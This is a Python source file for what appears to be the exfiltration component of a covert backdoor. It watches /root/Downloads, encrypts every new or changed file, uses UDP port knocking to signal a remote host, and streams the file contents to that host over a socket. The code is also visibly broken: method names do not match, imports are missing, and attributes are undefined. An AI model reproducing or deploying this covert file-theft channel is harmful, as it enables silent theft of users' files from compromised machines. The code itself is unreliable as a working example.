from watchdog.events import PatternMatchingEventHandler, DirModifiedEvent
from watchdog.observers import Observer
import encryption

class MyEventHandler(PatternMatchingEventHandler):
    def __init__(self, patterns=None):
        PatternMatchingEventHandler.__init__(self, patterns)

    def on_created(self, event):
        self.sendFile(event.src_path)

    def on_modified(self, event):
        if type(event) == DirModifiedEvent:
            return

        self.sendFile(event.src_path)

    def sendFile(self, filename):
        encryptedString = encryption.encryptFile(filename)

        knocker = self.portKnocking(self.knockList)
        time.sleep(3)

        sock = helpers.createSocket()
        sock.connect((self.remoteIP, self.listenPort))

        sock.sendall(encryptedString)
        sock.send(b'EOF')

    def portKnocker(self, knockList):
        for port in knockList:
            pkt = IP(src=self.localIP, dst=self.remoteIP)/UDP(sport=self.localPort, dport=int(port))
            send(pkt, verbose=False)
            time.sleep(0.1)

class FileUtils(object):
    def __init__(self):
        self.watches = []
        self.observer = Observer()
        self.observer.start()

    def addWatch(self, path, filename=None, recursive=False):
        if filename is None:
            self.watches.append(self.observer.schedule(MyEventHandler(), path, recursive))
            return

        if not path.endswith('/'):
            full_path = path + '/' + filename
        else:
            full_path = path + filename
        self.watches.append(self.observer.schedule(MyEventHandler([full_path,]), path, recursive))

    def removeWatch(self, path):
        if not path.endswith('/'):
            path += '/'

        for watch in self.watches:
            if watch.path == path:
                self.observer.unschedule(watch)
                return True
        return False

    def removeAllWatches(self):
        self.observer.unschedule_all()

def main():
    fileutils = FileUtils()
    fileutils.addWatch("/root/Downloads", None, True)


if __name__ == '__main__':
    main()
